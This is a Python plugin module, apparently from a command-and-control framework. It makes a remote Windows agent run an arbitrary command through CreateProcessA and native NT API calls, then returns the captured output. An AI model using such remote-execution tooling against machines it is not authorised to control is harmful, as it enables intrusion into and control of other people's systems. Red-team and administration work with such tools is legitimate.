NAME = "execkernel"
DESCRIPTION = "Execute a command via kernel32!CreateProcessA, WAIT for completion, and capture output"
PARAMS = [
    {"name":"command_line", "description":"Command to run (e.g. tasklist)", "type":"str"}
]
# Requires the full Win32/Native hybrid stack
DEPENDENCIES = [
    "NtAllocateVirtualMemory", 
    "CreatePipe",            # Create the redirection pipe
    "CreateProcess",           # kernel32!CreateProcessA wrapper
    "NtWaitForSingleObject",   # Wait for process exit
    "NtReadFile",              # Capture stdout
    "NtClose",                 # Cleanup handles
    "NtFreeVirtualMemory"      # Cleanup buffers,
]
DEFAULT = True

def function(agent_id, args):
    from services.orders import read_from_agent
    import time
    
    # 0. RESOLVE DEPENDENCIES

    command_raw = args[0]
    full_command = f"{command_raw}"
    
    # 1. CREATE OUTPUT PIPE (\Device\NamedPipe\)
    # DesiredAccess: 0xC0100000 (Generic Read/Write / Synchronize)
    pipe_ret = CreatePipe(agent_id, [])
    if pipe_ret["retval"] == 0:
        return {"Result": f"Failed to create pipe"}
    hPipeRead = pipe_ret["READ_HANDLE"]
    hPipeWrite = pipe_ret["WRITE_HANDLE"]

    # 2. ALLOCATE BUFFER FOR OUTPUT (8KB)
    output_buf_size = 8192
    alloc_ret = NtAllocateVirtualMemory(agent_id, [output_buf_size, 0x04])
    if alloc_ret["retval"] != 0:
        NtClose(agent_id, [hPipeRead])
        NtClose(agent_id, [hPipeWrite])
        return {"Result": "Failed output buffer allocation"}
    p_output_buffer = alloc_ret["allocated_memory"]
    # 3. EXECUTE PROCESS (kernel32!CreateProcessA)
    # This dependency handles STARTUPINFOA (redirection) and bInheritHandles internally
    proc_ret = CreateProcess(agent_id, [full_command, hPipeWrite])
    captured_output = ""
    if proc_ret["retval"] == 0:
        hProcess = proc_ret["PROCESS_HANDLE"]
        hThread  = proc_ret["THREAD_HANDLE"]

        #printf"[*] Process launched (hProcess: {hex(hProcess)}). Waiting for termination...")

        # 4. WAIT FOR PROCESS TO FINISH (NtWaitForSingleObject)
        # We wait for hProcess to enter a signaled state (exit)
        # Timeout: 10000ms (10 seconds) to prevent the agent from hanging indefinitely
        wait_ret = NtWaitForSingleObject(agent_id, [hProcess, 10000])
        
        if wait_ret["retval"] == 0:
            # 5. READ OUTPUT (NtReadFile)
            # Since the process has (likely) exited, the pipe now contains the full output buffer
            read_ret = NtReadFile(agent_id, [hPipeRead, p_output_buffer, output_buf_size])
            if read_ret["retval"] == 0 or read_ret["retval"] == 0xC0000011:
                raw_data = read_from_agent(agent_id, p_output_buffer, output_buf_size)
                # UTF-8 decode and strip trailing nulls
                print(raw_data)
                captured_output = raw_data.decode('utf-8', errors='ignore').split('\x00')[0]

        # 6. CLEANUP HANDLES
        NtClose(agent_id, [hProcess])
        NtClose(agent_id, [hThread])
    else:
        captured_output = "Error: CreateProcess failed to launch binary."

    # 7. FINAL CLEANUP
    NtClose(agent_id, [hPipeRead])
    NtClose(agent_id, [hPipeWrite])
    NtFreeVirtualMemory(agent_id, [p_output_buffer, output_buf_size, 0x8000])

    return {
        "retval": proc_ret["retval"],
        "Command": full_command,
        "Output": captured_output.strip(),
        "Status": hex(proc_ret.get("retval", 0))
    }